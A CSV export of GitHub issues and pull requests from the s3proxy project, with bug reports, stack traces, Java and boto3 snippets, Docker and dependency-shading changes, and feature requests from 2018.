gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/275,318795143,MDU6SXNzdWUzMTg3OTUxNDM=,275,Streaming data from Azure to local file taking a lot of time compared to using Jclouds,36193793,closed,FALSE,NA,NA,4,2018-04-30T06:18:20Z,2018-05-03T19:02:32Z,2018-04-30T08:49:57Z,NONE,NA,"I am using S3Proxy to download a file of size 150 MB to my local storage. 
I used s3 java sdk to make calls and changed the endpoint to the s3proxy endpoint which is running locally.

This is the code I am using to download the file ->

        GetObjectRequest getObjectRequest = new GetObjectRequest(bucketname , filename);
        final Instant t1 = Instant.now();
        S3Object s3Object = s3.getObject(getObjectRequest);
        final Instant t2 = Instant.now();
        System.out.println(""Object Get time  time = "" + Duration.between(t1, t2).toMillis());
        S3ObjectInputStream s3ObjectInputStream = s3Object.getObjectContent();
        final Instant t3 = Instant.now();
        writeToFile(s3ObjectInputStream, filename);
        final Instant t4 = Instant.now();
        System.out.println(""Download file time = "" + Duration.between(t3, t4).toMillis());

Here is the function writeToFile which writes the stream to a file. 

    static void writeToFile(InputStream inputStream, String filename) throws IOException {

        File file = new File(filePath + filename);
        if (!file.createNewFile()) {
            file.delete();
            file.createNewFile();
        }
        java.nio.file.Files.copy(inputStream, file.toPath(), StandardCopyOption.REPLACE_EXISTING);

    }

This is the output -> 
Object Get time = 171300
Download file time = 534

Why does the get object call takes so long ? That call should only return the stream from where we can download the file right?


I did the same experiment by using Jclouds API directly to download the same file and download it locally.
Here is the code I used -> 

        BlobStoreContext context = ContextBuilder.newBuilder(""azureblob"")
                                                 .credentials(System.getenv(""AZURE_ACCESS_ID""), System.getenv
                                                         (""AZURE_ACCESS_KEY""))
                                                 .buildView(BlobStoreContext.class);
        BlobStore blobStore = context.getBlobStore();
        final Instant t1 = Instant.now();
        Blob blob = blobStore.getBlob(containerName, filename);
        final Instant t2 = Instant.now();
        System.out.println(""Object Get time  time = "" + Duration.between(t1, t2).toMillis());
        InputStream inputStream = blob.getPayload().openStream();
        final Instant t3 = Instant.now();
        writeToFile(inputStream, filename);
        final Instant t4 = Instant.now();
        System.out.println(""Download file time "" + Duration.between(t3, t4).toMillis());


Here is the output for this code sample ->
Object Get time = 3750
Download file time = 270776

This looks like an acceptable time and comparable to the time which azure sdk provides.

My question is why s3 get object call taking so much longer than the actual streaming time when using s3proxy?


",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/275/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/275/comments,https://api.github.com/repos/gaul/s3proxy/issues/275/events,https://github.com/gaul/s3proxy/issues/275,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/274,316185753,MDExOlB1bGxSZXF1ZXN0MTgzMDAwMzM4,274,"update deprecated image, fix minor Label change",18464684,closed,FALSE,NA,NA,1,2018-04-20T09:01:21Z,2018-04-21T18:52:04Z,2018-04-20T15:52:17Z,CONTRIBUTOR,NA,"Java is deprecated as the state:
""This image is officially deprecated in favor of the openjdk image, and will receive no further updates after 2016-12-31 (Dec 31, 2016). Please adjust your usage accordingly.""

I adjusted it to the corresponding 7-alpine-jre tag  from openjdk
https://hub.docker.com/_/openjdk/

the MAINTAINER instruction is deprecated as of Docker Version: 
1.13.0
https://docs.docker.com/engine/deprecated/#maintainer-in-dockerfile

all the best",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/274/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/274/comments,https://api.github.com/repos/gaul/s3proxy/issues/274/events,https://github.com/gaul/s3proxy/pull/274,https://api.github.com/repos/gaul/s3proxy/pulls/274
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/273,315115882,MDExOlB1bGxSZXF1ZXN0MTgyMjA3NDA1,273,shading guava/jclouds,2090136,closed,FALSE,NA,NA,6,2018-04-17T15:35:58Z,2018-06-04T09:17:41Z,2018-06-04T09:17:41Z,NONE,NA,"Hi :)
Following discussions here: https://issues.apache.org/jira/browse/JCLOUDS-1225 and here: https://github.com/gaul/s3proxy/issues/209
I made this PR that shades jclouds and shades/relocates guava. Our issue, as @massdosage described in JCLOUDS-1225, is that we got a dependency on hadoop which is on a rather old guava version conflicting with what s3proxy pulls in.

Following the Jetty shading I've went for a similar solution with guava. I'll add some inline comments with explanations.

Happy to have a discussion or make any changes.
",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/273/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/273/comments,https://api.github.com/repos/gaul/s3proxy/issues/273/events,https://github.com/gaul/s3proxy/pull/273,https://api.github.com/repos/gaul/s3proxy/pulls/273
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/272,314347730,MDExOlB1bGxSZXF1ZXN0MTgxNjU4NzQ5,272,Add jaxb-api as a dependency,848247,closed,FALSE,NA,NA,1,2018-04-14T17:42:34Z,2018-11-04T20:50:12Z,2018-11-04T20:49:26Z,OWNER,NA,"This allows Java 9 to run S3Proxy.  Java 9 removed `javax.xml` which
previous Java versions included so adding the explicit dependency
allows both versions to work.  References #270.",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/272/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/272/comments,https://api.github.com/repos/gaul/s3proxy/issues/272/events,https://github.com/gaul/s3proxy/pull/272,https://api.github.com/repos/gaul/s3proxy/pulls/272
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/271,314278505,MDU6SXNzdWUzMTQyNzg1MDU=,271,Unable to upload an object with a non-printable ASCII character as metadata value,703870,closed,FALSE,NA,NA,2,2018-04-13T23:42:07Z,2021-04-09T07:18:16Z,2021-04-09T07:18:16Z,CONTRIBUTOR,NA,"Unlike AWS S3, S3Proxy does not handle unprintable ASCII characters used as part of the metadata value. Here is how to reproduce the error with boto3:
```
client = boto3.client('s3', aws_access_key_id='key', aws_secret_access_key='secret', endpoint_url='http://localhost:20080')
client.put_object(Bucket='test-bucket', Key='test', Body='', Metadata={'meta1': '\x04meta'})
```

S3Proxy hits the following exception:
```
[s3proxy] W 04-13 16:37:21.648 S3Proxy-Jetty-18 o.g.s.o.e.j.http.HttpParser:1693 |::] Illegal character 0x4 in state=HEADER_VALUE for buffer HeapByteBuffer@34c3a894[p=128,l=369,c=16384,r=241]={PUT /test-bucket...z-meta-meta1: \x04<<<meta\r\nContent-MD5...kuMANWY/hk=\r\n\r\n>>>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00...\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00}
[s3proxy] W 04-13 16:37:21.650 S3Proxy-Jetty-18 o.g.s.o.e.j.http.HttpParser:1318 |::] badMessage: 400 Illegal character 0x4 for HttpChannelOverHttp@5d6a8d09{r=0,c=false,a=IDLE,uri=/test-bucket/test}
```

The same succeeds in S3, where the character is then MIME-encoded: `x-amz-meta-meta1: =?UTF-8?Q?meta-=04?=`.",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/271/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/271/comments,https://api.github.com/repos/gaul/s3proxy/issues/271/events,https://github.com/gaul/s3proxy/issues/271,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/270,314276132,MDU6SXNzdWUzMTQyNzYxMzI=,270,Unable to build S3Proxy with OpenJDK 9,703870,closed,FALSE,NA,NA,4,2018-04-13T23:22:18Z,2018-11-04T21:03:30Z,2018-11-04T21:03:30Z,CONTRIBUTOR,NA,"When building with OpenJDK 9, I get the following stack trace from ErrorProne:
```
Caused by: java.lang.NullPointerException
    at com.sun.tools.javac.file.Locations.getPathEntries (Locations.java:157)
    at com.sun.tools.javac.file.Locations.getPathEntries (Locations.java:141)
    at com.sun.tools.javac.file.Locations.access$000 (Locations.java:80)
    at com.sun.tools.javac.file.Locations$BootClassPathLocationHandler.computePath (Locations.java:649)
    at com.sun.tools.javac.file.Locations$BootClassPathLocationHandler.lazy (Locations.java:677)
    at com.sun.tools.javac.file.Locations$BootClassPathLocationHandler.isDefault (Locations.java:566)
    at com.sun.tools.javac.file.Locations.isDefaultBootClassPath (Locations.java:115)
    at com.sun.tools.javac.util.BaseFileManager.isDefaultBootClassPath (BaseFileManager.java:137)
    at com.sun.tools.javac.main.Arguments.validate (Arguments.java:411)
    at com.sun.tools.javac.main.Main.compile (Main.java:215)
    at com.google.errorprone.ErrorProneCompiler.run (ErrorProneCompiler.java:249)
    at com.google.errorprone.ErrorProneCompiler.run (ErrorProneCompiler.java:159)
    at com.google.errorprone.ErrorProneCompiler.compile (ErrorProneCompiler.java:88)
```

I cannot reproduce this with OpenJDK 8. Upgrading the `error_prone_core` dependency to 2.1.2 resolves this for me. The JDK version is: 9.0.4+12-4 from Debian.",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/270/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/270/comments,https://api.github.com/repos/gaul/s3proxy/issues/270/events,https://github.com/gaul/s3proxy/issues/270,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/269,314056535,MDExOlB1bGxSZXF1ZXN0MTgxNDQ5NzI0,269,Add `UTF-8` character encoding to all S3 responses,124870,closed,FALSE,NA,NA,1,2018-04-13T10:37:14Z,2018-04-17T05:52:40Z,2018-04-17T05:52:29Z,CONTRIBUTOR,NA,"re #237 This makes all responses specify a character encoding of `UTF-8`. The cause of the inconsistent behaviour was jetty's configuration which uses `charset=ISO-8859-1` as its default if none other is given and jetty does not include a default character encoding for `application/xml`.

As jetty will add the encoding if it is not present, forcing `UTF-8` seems the most sensible solution and all the AWS xml responses specify an XML encoding of `UTF-8` in the xml preamble `<?xml version=""1.0"" encoding=""UTF-8""?>`.",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/269/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/269/comments,https://api.github.com/repos/gaul/s3proxy/issues/269/events,https://github.com/gaul/s3proxy/pull/269,https://api.github.com/repos/gaul/s3proxy/pulls/269
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/268,311486809,MDU6SXNzdWUzMTE0ODY4MDk=,268,Illegal key size Exception on accessing the Azure Blob,37899795,closed,FALSE,NA,NA,3,2018-04-05T06:27:19Z,2018-04-13T10:49:06Z,2018-04-11T04:41:23Z,NONE,NA,"I have set up the S3proxy and am facing the below issue when i try to access my s3proxy. 
I got a HTTP 500 response and on adding up few stack traces, I end up with the Illegal Key size issue.

```
11:45:35.659 [S3Proxy-Jetty-16 - /] DEBUG jclouds.headers - >> Authorization: SharedKeyLite dcmpoc01:SzfJUaiDKNeJEodYVM65XMfPkBIfwLONBDisqktPI+U=
11:45:38.097 [S3Proxy-Jetty-16 - /] ERROR org.gaul.s3proxy.Main - org.jclouds.http.HttpResponseException: java.security.InvalidKeyException: Illegal key size connecting to GET https://xxxx.blob.core.windows.net/xxxx?restype=container&comp=list&include=metadata HTTP/1.1
11:45:38.097 [S3Proxy-Jetty-16 - /] ERROR org.gaul.s3proxy.Main - 
```

Can you please throw some pointers on this?",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/268/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/268/comments,https://api.github.com/repos/gaul/s3proxy/issues/268/events,https://github.com/gaul/s3proxy/issues/268,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/267,301285404,MDU6SXNzdWUzMDEyODU0MDQ=,267,HDFS storage backend,848247,open,FALSE,NA,NA,0,2018-03-01T05:46:54Z,2018-03-01T05:46:54Z,NA,OWNER,NA,"Allow S3 applications to use HDFS.  jclouds has some long-bitrotted example of this:

https://github.com/jclouds/jclouds-examples/tree/master/blobstore-hdfs

There are a couple ways to do this, including using the Java bindings:

https://hadoop.apache.org/docs/stable/api/org/apache/hadoop/fs/FileSystem.html

or the REST API:

https://hadoop.apache.org/docs/current/hadoop-project-dist/hadoop-hdfs/WebHDFS.html
https://hadoop.apache.org/docs/current/hadoop-hdfs-httpfs/",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/267/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/267/comments,https://api.github.com/repos/gaul/s3proxy/issues/267/events,https://github.com/gaul/s3proxy/issues/267,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/266,300062942,MDU6SXNzdWUzMDAwNjI5NDI=,266,Glacier integration,848247,closed,FALSE,NA,NA,1,2018-02-25T21:26:41Z,2019-02-05T18:19:40Z,2019-02-05T18:19:40Z,OWNER,NA,"With the integration of storage classes #234, S3Proxy supports both STANDARD and INFREQUENT_IA.  The underlying jclouds also supports an archive tier, which maps onto GLACIER storage class.  The S3 API does not allow creating GLACIER objects, instead relying on lifecycle management, but it does support restoring:

https://docs.aws.amazon.com/AmazonS3/latest/API/RESTObjectPOSTrestore.html

S3Proxy should support restoring objects via this API.  We should also consider allowing creation of GLACIER objects for Azure and GCS, which respectively map onto Coldline and Archive, although this deviates from S3 semantics.",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/266/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/266/comments,https://api.github.com/repos/gaul/s3proxy/issues/266/events,https://github.com/gaul/s3proxy/issues/266,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/265,299653635,MDExOlB1bGxSZXF1ZXN0MTcwOTcxODkx,265,Shade and relocate Jetty dependencies,29457,closed,FALSE,NA,NA,3,2018-02-23T09:48:39Z,2018-02-23T18:31:05Z,2018-02-23T18:29:28Z,CONTRIBUTOR,NA,Fixes #263 ,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/265/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/265/comments,https://api.github.com/repos/gaul/s3proxy/issues/265/events,https://github.com/gaul/s3proxy/pull/265,https://api.github.com/repos/gaul/s3proxy/pulls/265
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/264,299645490,MDExOlB1bGxSZXF1ZXN0MTcwOTY1OTA3,264,Add JUnit Rule to project,7541790,closed,FALSE,NA,NA,5,2018-02-23T09:18:57Z,2018-03-05T09:06:35Z,2018-03-01T17:44:22Z,CONTRIBUTOR,NA,Fixes #261,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/264/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/264/comments,https://api.github.com/repos/gaul/s3proxy/issues/264/events,https://github.com/gaul/s3proxy/pull/264,https://api.github.com/repos/gaul/s3proxy/pulls/264
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/263,298934194,MDU6SXNzdWUyOTg5MzQxOTQ=,263,Jetty dependency issues,29457,closed,FALSE,NA,NA,3,2018-02-21T11:29:00Z,2018-02-23T18:29:27Z,2018-02-23T18:29:27Z,CONTRIBUTOR,NA,"We have been trying to use S3Proxy to test code in a project which also uses Hive. Hive requires Jetty 7.x while S3Proxy requires Jetty 9.x. We have certain use cases where the tests are impossible to run as obviously only one version of Jetty can be on the classpath and we get various exceptions due to missing Jetty classes, incompatible method definitions etc. Would it be possible to shade and relocate the Jetty classes inside S3Proxy so the usage of it is effectively hidden from downstream users? I'm not a huge fan of shading but in situations like this it can be really helpful for allowing integration into projects which depend on different versions of a required library.",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/263/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/263/comments,https://api.github.com/repos/gaul/s3proxy/issues/263/events,https://github.com/gaul/s3proxy/issues/263,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/262,298181670,MDU6SXNzdWUyOTgxODE2NzA=,262,Issues connecting to Azure Blob Storage,1772234,open,FALSE,NA,NA,14,2018-02-19T07:25:35Z,2019-06-14T20:23:45Z,NA,NONE,NA,"I'm having trouble connecting to Azure Blob Storage as a backend. To try and troubleshoot I set the s3proxy auth to 'none' and ran 'curl http://s3proxy/container' and got a HTTP error 400. These were returned in the debug logs:

```
2018-02-19T07:12:49.238722860Z app[web.1]: [s3proxy] D 02-19 07:12:49.238 S3Proxy-Jetty-13 o.gaul.s3proxy.S3ProxyHandler:280 |::] request: Request(GET /container)@188a433d
2018-02-19T07:12:49.238912464Z app[web.1]: [s3proxy] D 02-19 07:12:49.238 S3Proxy-Jetty-13 o.gaul.s3proxy.S3ProxyHandler:302 |::] header: Host: s3proxy
2018-02-19T07:12:49.239123267Z app[web.1]: [s3proxy] D 02-19 07:12:49.238 S3Proxy-Jetty-13 o.gaul.s3proxy.S3ProxyHandler:302 |::] header: X-Forwarded-Proto: http
2018-02-19T07:12:49.239333571Z app[web.1]: [s3proxy] D 02-19 07:12:49.239 S3Proxy-Jetty-13 o.gaul.s3proxy.S3ProxyHandler:302 |::] header: X-Forwarded-For: 8.8.8.8
2018-02-19T07:12:49.239541374Z app[web.1]: [s3proxy] D 02-19 07:12:49.239 S3Proxy-Jetty-13 o.gaul.s3proxy.S3ProxyHandler:302 |::] header: User-Agent: curl/7.54.0
2018-02-19T07:12:49.239720977Z app[web.1]: [s3proxy] D 02-19 07:12:49.239 S3Proxy-Jetty-13 o.gaul.s3proxy.S3ProxyHandler:302 |::] header: X-Request-Start: 1519024369.236
2018-02-19T07:12:49.239920081Z app[web.1]: [s3proxy] D 02-19 07:12:49.239 S3Proxy-Jetty-13 o.gaul.s3proxy.S3ProxyHandler:302 |::] header: Accept: */*
2018-02-19T07:12:49.240116884Z app[web.1]: [s3proxy] D 02-19 07:12:49.239 S3Proxy-Jetty-13 o.gaul.s3proxy.S3ProxyHandler:302 |::] header: Connection: upgrade
2018-02-19T07:12:49.240325887Z app[web.1]: [s3proxy] D 02-19 07:12:49.240 S3Proxy-Jetty-13 o.gaul.s3proxy.S3ProxyHandler:302 |::] header: X-Forwarded-Port: 80
2018-02-19T07:12:49.242509124Z app[web.1]: [s3proxy] T 02-19 07:12:49.242 S3Proxy-Jetty-13 o.j.r.i.InvokeHttpMethod:47 |::] >> converting ListBlobs
2018-02-19T07:12:49.244756062Z app[web.1]: [s3proxy] T 02-19 07:12:49.244 S3Proxy-Jetty-13 o.j.r.i.RestAnnotationProcessor:47 |::] no annotations on class or invocation.getInvoked(): org.jclouds.azureblob.AzureBlobClient.public abstract org.jclouds.azureblob.domain.ListBlobsResponse org.jclouds.azureblob.AzureBlobClient.listBlobs(java.lang.String,org.jclouds.azureblob.options.ListBlobsOptions[])
2018-02-19T07:12:49.245069868Z app[web.1]: [s3proxy] T 02-19 07:12:49.244 S3Proxy-Jetty-13 o.j.r.i.RestAnnotationProcessor:47 |::] no annotations on class or invocation.getInvoked(): org.jclouds.azureblob.AzureBlobClient.public abstract org.jclouds.azureblob.domain.ListBlobsResponse org.jclouds.azureblob.AzureBlobClient.listBlobs(java.lang.String,org.jclouds.azureblob.options.ListBlobsOptions[])
2018-02-19T07:12:49.245406373Z app[web.1]: [s3proxy] T 02-19 07:12:49.245 S3Proxy-Jetty-13 o.j.r.i.RestAnnotationProcessor:47 |::] looking up default endpoint for org.jclouds.azureblob.AzureBlobClient.public abstract org.jclouds.azureblob.domain.ListBlobsResponse org.jclouds.azureblob.AzureBlobClient.listBlobs(java.lang.String,org.jclouds.azureblob.options.ListBlobsOptions[])[dropshare, [Lorg.jclouds.azureblob.options.ListBlobsOptions;@599bb5d7]
2018-02-19T07:12:49.245810180Z app[web.1]: [s3proxy] T 02-19 07:12:49.245 S3Proxy-Jetty-13 o.j.r.i.RestAnnotationProcessor:47 |::] using default endpoint Optional.of() for org.jclouds.azureblob.AzureBlobClient.public abstract org.jclouds.azureblob.domain.ListBlobsResponse org.jclouds.azureblob.AzureBlobClient.listBlobs(java.lang.String,org.jclouds.azureblob.options.ListBlobsOptions[])[dropshare, [Lorg.jclouds.azureblob.options.ListBlobsOptions;@599bb5d7]
2018-02-19T07:12:49.246188287Z app[web.1]: [s3proxy] T 02-19 07:12:49.245 S3Proxy-Jetty-13 o.j.r.i.RestAnnotationProcessor:47 |::] adding filter org.jclouds.azure.storage.filters.SharedKeyLiteAuthentication@74d7313b from annotation on org.jclouds.azureblob.AzureBlobClient
```

Any clues?",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/262/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/262/comments,https://api.github.com/repos/gaul/s3proxy/issues/262/events,https://github.com/gaul/s3proxy/issues/262,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/261,297865145,MDU6SXNzdWUyOTc4NjUxNDU=,261,Add JUnit rule for easy stubbing in JUnit tests,7541790,closed,FALSE,NA,NA,8,2018-02-16T17:38:59Z,2018-03-02T18:18:03Z,2018-03-01T17:44:22Z,CONTRIBUTOR,NA,"We've created a JUnit Rule which we've like to contribute to this project. 

The rule is meant to make it easy to stub a S3 endpoint in a JUnit test and is based on S3Proxy and we think it would be useful to other developer out there. The following snapshot of code shows how we've been using this rule in our tests:

```
  public @Rule S3ProxyRule s3Proxy = S3ProxyRule
      .builder()
      .withPort(s3ProxyPort)
      .withCredentials(AWS_ACCESS_KEY, AWS_SECRET_KEY)
      .ignoreUnknownHeaders()
      .build();
```

Then

```
  private AmazonS3 s3Client;

  @Before
  public void init() throws Exception {
    s3Client = AmazonS3ClientBuilder
        .standard()
        .withCredentials(
            new AWSStaticCredentialsProvider(new BasicAWSCredentials(s3Proxy.getAccessKey(), s3Proxy.getSecretKey())))
        .withEndpointConfiguration(new EndpointConfiguration(s3Proxy.getProxyUrl(), Regions.US_EAST_1.getName()))
        .build();
    s3Client.createBucket(""my-test-bucket"");
  }

```

I was going to open a PR with the code but I prefer to discuss where in the project this should leave. Perhaps convert the project to make it multi-module? Please advise


",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/261/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/261/comments,https://api.github.com/repos/gaul/s3proxy/issues/261/events,https://github.com/gaul/s3proxy/issues/261,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/260,296815351,MDU6SXNzdWUyOTY4MTUzNTE=,260,Make ServletRequest available to BlobStoreLocator ,5568601,open,FALSE,NA,NA,2,2018-02-13T17:07:52Z,2018-02-14T10:44:01Z,NA,NONE,NA,"To help make s3proxy more generic and suitable for custom or embedded usage, it will be better if locateBlobStore method of interface BlobStoreLocator is passed current ServletRequest so it can take more complex decision in locating suitable BlobStore based on factors like hostname / virtualhost or any other factor/info contained in ServletRequest.

This will help implement, for example, a multi-tenant blob store/source.

",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/260/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/260/comments,https://api.github.com/repos/gaul/s3proxy/issues/260/events,https://github.com/gaul/s3proxy/issues/260,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/259,296691232,MDExOlB1bGxSZXF1ZXN0MTY4ODEwNDY5,259,Added Eclipse config files to .gitignore,29457,closed,FALSE,NA,NA,1,2018-02-13T10:45:32Z,2018-02-13T16:51:44Z,2018-02-13T16:51:34Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/259/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/259/comments,https://api.github.com/repos/gaul/s3proxy/issues/259/events,https://github.com/gaul/s3proxy/pull/259,https://api.github.com/repos/gaul/s3proxy/pulls/259
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/258,296233510,MDU6SXNzdWUyOTYyMzM1MTA=,258,object prefetching,848247,open,FALSE,NA,NA,0,2018-02-11T22:41:19Z,2018-02-11T22:41:19Z,NA,OWNER,NA,"Some client workloads consist of reading many small objects, often sequentially in object listing order.  S3Proxy could prefetch these to save time when using remote blobstores.",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/258/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/258/comments,https://api.github.com/repos/gaul/s3proxy/issues/258/events,https://github.com/gaul/s3proxy/issues/258,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/257,291062380,MDExOlB1bGxSZXF1ZXN0MTY0NzQxMTc5,257,Update README.md,1266519,closed,FALSE,NA,NA,3,2018-01-24T02:23:29Z,2018-01-24T05:02:49Z,2018-01-24T05:02:49Z,NONE,NA,,NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/257/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/257/comments,https://api.github.com/repos/gaul/s3proxy/issues/257/events,https://github.com/gaul/s3proxy/pull/257,https://api.github.com/repos/gaul/s3proxy/pulls/257
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/256,290267888,MDU6SXNzdWUyOTAyNjc4ODg=,256,Health Check Best Practice,723565,closed,FALSE,NA,NA,1,2018-01-21T12:13:07Z,2018-02-10T20:44:13Z,2018-02-10T20:44:13Z,NONE,NA,I really like this project but I'm not sure what the health check best practice is. Is there a /ping or /health check endpoint? Any simple way to get a 2xx response?,NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/256/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/256/comments,https://api.github.com/repos/gaul/s3proxy/issues/256/events,https://github.com/gaul/s3proxy/issues/256,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/255,289968376,MDU6SXNzdWUyODk5NjgzNzY=,255,NPE in S3ProxyHandler,9644502,closed,FALSE,NA,NA,1,2018-01-19T13:00:57Z,2018-01-25T04:25:40Z,2018-01-25T04:25:40Z,NONE,NA,"Hi team!
Please, release the library with #251 fix. Right now, we cannot use the latest version with anonymous identity, get NPE in S3ProxyHandler on 400 line:
`if (authHeader.authenticationType == AuthenticationType.AWS_V2`
There is no condition for `anonymousIdentity`",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/255/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/255/comments,https://api.github.com/repos/gaul/s3proxy/issues/255/events,https://github.com/gaul/s3proxy/issues/255,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/254,288668404,MDU6SXNzdWUyODg2Njg0MDQ=,254,Null pointer exception with README example,5542307,closed,FALSE,NA,NA,2,2018-01-15T17:29:19Z,2018-01-20T20:17:04Z,2018-01-15T18:05:20Z,NONE,NA,"Hello,

While testing s3proxy with the example given in the README, I got a NullPointerException.

s3Proxy.conf:
```
s3proxy.authorization=none
s3proxy.endpoint=http://127.0.0.1:7777
jclouds.provider=filesystem
jclouds.filesystem.basedir=/tmp/s3proxy
```

Any command like `curl http://127.0.0.1:7777` returns an error:
```
<html>
<head>
<meta http-equiv=""Content-Type"" content=""text/html;charset=ISO-8859-1""/>
<title>Error 500 </title>
</head>
<body>
<h2>HTTP ERROR: 500</h2>
<p>Problem accessing /. Reason:
<pre>    java.lang.NullPointerException</pre></p>
<hr /><i><small>Powered by Jetty://</small></i>
</body>
</html>
```

And a stacktrace;
```
java.lang.NullPointerException: null
        at org.gaul.s3proxy.S3ProxyHandler.doHandle(S3ProxyHandler.java:400)
        at org.gaul.s3proxy.S3ProxyHandlerJetty.handle(S3ProxyHandlerJetty.java:70)
        at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:97)
        at org.eclipse.jetty.server.Server.handle(Server.java:499)
        at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:311)
        at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:258)
        at org.eclipse.jetty.io.AbstractConnection$2.run(AbstractConnection.java:544)
        at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:635)
        at org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:555)
        at java.lang.Thread.run(Thread.java:748)
```

When I plugged with a java debugger :

![image](https://user-images.githubusercontent.com/5542307/34954570-31f30562-fa21-11e7-90ee-abe13e733dbf.png)

Do I missed something ?



",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/254/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/254/comments,https://api.github.com/repos/gaul/s3proxy/issues/254/events,https://github.com/gaul/s3proxy/issues/254,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/253,286734667,MDU6SXNzdWUyODY3MzQ2Njc=,253,Usage without Docker broken in 1.5.4,110622,closed,FALSE,NA,NA,2,2018-01-08T12:46:39Z,2018-01-09T06:57:29Z,2018-01-08T23:32:39Z,NONE,NA,"Tested with 1.5.3 and it worked, but seems to be broken with 1.5.4.

s3proxy.conf
=========
s3proxy.authorization=none
s3proxy.endpoint=http://127.0.0.1:8080
jclouds.provider=filesystem
jclouds.filesystem.basedir=/tmp/s3proxy

server
=====
$ target/s3proxy --properties ../s3proxy.conf
[s3proxy] I 01-08 14:44:14.367 main org.eclipse.jetty.util.log:186 |::] Logging initialized @1061ms
